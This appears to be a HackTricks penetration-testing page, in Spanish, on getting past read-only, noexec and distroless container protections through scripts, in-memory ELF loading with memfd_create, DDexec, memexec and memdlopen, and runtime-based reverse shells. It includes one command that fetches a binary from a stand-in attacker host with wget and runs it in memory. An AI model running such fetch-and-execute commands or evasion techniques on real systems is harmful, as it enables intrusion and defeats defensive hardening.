# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

En los siguientes videos se explican con más detalle las técnicas mencionadas en esta página:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## Escenario read-only / no-exec

En un contenedor, puedes montar el sistema de archivos raíz como de solo lectura configurando **`readOnlyRootFilesystem: true`** en el contexto de seguridad.<sup>[[3]](#references)</sup> Por ejemplo:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Que la raíz sea de solo lectura no hace que los volúmenes montados por separado también lo sean. Docker trata **`/dev/shm`** como un montaje IPC, mientras que opciones de tmpfs como `rw` y `noexec` son configuraciones de ejecución; inspecciona las opciones de montaje del contenedor de destino antes de confiar en cualquiera de estos comportamientos.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Desde la perspectiva de un red team, esta combinación puede dificultar la descarga y ejecución de binarios que no estén ya disponibles (por ejemplo, backdoors o herramientas de enumeración).<sup>[[4]](#references)[[5]](#references)</sup>

## El bypass más fácil: Scripts

Un montaje `noexec` bloquea la ejecución directa de binarios en ese montaje, pero un intérprete todavía puede leer e interpretar un script. Por tanto, si `sh` o `python` está disponible, puedes ejecutar un script de shell o Python mediante ese intérprete.<sup>[[5]](#references)</sup>

Esto no sirve si la herramienta necesaria es un binario.<sup>[[5]](#references)</sup>

## Bypasses de memoria

Cuando se bloquea la ejecución directa desde una ruta montada, una opción es cargar el ELF en memoria y ejecutarlo mediante una ruta en memoria. Esto evita la comprobación `noexec` de ese montaje, pero no elimina otros controles del kernel, de permisos o de políticas.<sup>[[5]](#references)[[6]](#references)</sup>

### Bypass con FD + syscall exec

Si un runtime de scripting puede acceder a la interfaz de Linux correspondiente, puede crear un descriptor de archivo anónimo respaldado por RAM con **`memfd_create(2)`**, escribir en él los bytes del ELF y usar una ruta de ejecución basada en FD. El proyecto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) genera código Python, Perl o Ruby comprimido y codificado en base64 para este flujo de trabajo.<sup>[[6]](#references)[[7]](#references)</sup>

Actualmente, el proyecto documenta objetivos Python, Perl y Ruby; PHP o Node requieren una técnica o extensión específica para ese runtime, así que la ausencia de un generador para un lenguaje no significa que la ejecución en memoria sea imposible.<sup>[[6]](#references)[[12]](#references)</sup>

Consulta [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) para obtener una cobertura más amplia de la ejecución desde archivos anónimos, los patrones de staging relacionados y la detección y recopilación forense.

> [!WARNING]
> Un ejecutable normal escrito en **`/dev/shm`** sigue sujeto a la configuración **`noexec`** de ese montaje; abrirlo simplemente mediante un descriptor de archivo normal no cambia la política del montaje.<sup>[[5]](#references)</sup>
>
> El método exacto de ejecución en memoria también depende del runtime, la arquitectura, el kernel y los permisos disponibles.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) escribe un stager y un loader en el proceso de shell en ejecución mediante **`/proc/self/mem`** y luego transfiere el control a ese código.<sup>[[8]](#references)</sup>

Esto permite que el proceso cargue un binario proporcionado sin tener que colocarlo primero en un sistema de archivos ejecutable.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** puede cargar y **ejecutar** shellcode o un binario desde la **memoria**.<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

Para obtener más información sobre esta técnica, consulta Github o:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) es una implementación de DDexec que se ejecuta como daemon. Su daemon escucha solicitudes que contienen argumentos y bytes de programa sin procesar, crea un proceso hijo para cargar y ejecutar cada programa y mantiene al proceso padre como servidor.<sup>[[9]](#references)</sup>

El repositorio incluye un ejemplo de cómo **usar memexec para ejecutar binarios desde una reverse shell de PHP** en [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Con un propósito similar al de DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) es una implementación fileless de `dlopen()` para un objeto compartido o un programa. Su README documenta actualmente compatibilidad con ARM64, así que comprueba la arquitectura del objetivo antes de usarlo.<sup>[[10]](#references)</sup>

## Evasión de Distroless

Para una explicación específica de **qué es realmente distroless**, cuándo resulta útil, cuándo no y cómo cambia las técnicas de post-explotación en contenedores, consulta:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Qué es distroless

Las imágenes distroless contienen únicamente la aplicación y sus dependencias de ejecución; las imágenes oficiales omiten gestores de paquetes, shells y otros programas habituales en una distribución estándar de Linux.<sup>[[11]](#references)</sup>

Limitar la imagen de ejecución a esas dependencias reduce el software presente en producción y la cantidad que debe analizarse y rastrearse.<sup>[[11]](#references)</sup>

### Reverse Shell

En un contenedor distroless quizá **no encuentres `sh` ni `bash`** para usar un shell normal, ni utilidades comunes como `ls`, `whoami` o `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Por lo tanto, es posible que no funcione una reverse shell habitual basada en shell ni la enumeración basada en utilidades.<sup>[[11]](#references)</sup>

Si la aplicación comprometida incluye un runtime de lenguaje (por ejemplo, Python para una aplicación Flask o Node.js para una aplicación Node), es posible que un RCE aún pueda usar ese runtime para establecer un canal de comandos e inspeccionar el sistema mediante sus API.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Usa el lenguaje de scripting disponible para **enumerar el sistema** mediante las capacidades de ese lenguaje.<sup>[[12]](#references)</sup>

Si no hay protecciones **read-only/no-exec**, un canal de comandos puede escribir binarios en un punto de montaje con permisos de escritura y ejecución, y ejecutarlos; comprueba primero las opciones de montaje y los permisos.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Cuando existan estas protecciones, usa las **técnicas de ejecución en memoria anteriores** cuando el runtime, el kernel y los permisos lo permitan.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Puedes encontrar **ejemplos** de explotación de vulnerabilidades RCE para obtener **reverse shells** en lenguajes de scripting y ejecutar binarios desde la memoria en [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Explorando la manipulación de memoria de Linux para el sigilo y la evasión](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Intrusiones sigilosas con DDexec-ng y dlopen() en memoria - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Configurar un contexto de seguridad para un pod o contenedor](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - página del manual de Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
